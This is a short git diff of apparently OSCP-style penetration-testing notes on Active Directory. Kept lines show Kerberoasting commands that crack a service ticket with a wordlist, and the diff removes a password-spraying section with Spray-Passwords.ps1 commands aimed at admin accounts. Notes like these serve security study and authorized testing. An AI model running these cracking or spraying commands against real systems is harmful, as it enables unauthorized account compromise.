@@ -119,13 +119,6 @@ kerberos::list == klist
 sudo apt update && sudo apt install kerberoast
 python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
 ```
-###### Low and Slow Password Guessing
-https://github.com/KiritoLoveAsuna/Penetration-Testing/blob/main/Spray-Passwords.ps1
-```
-net accounts
-.\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins -Verbose
-.\Spray-Passwords.ps1 -File .\passwords.txt -Admins -Verbose
-```
 
 ### Lateral Movement
 /ticket - optional - filename for output the ticket - default is: ticket.kirbi.  
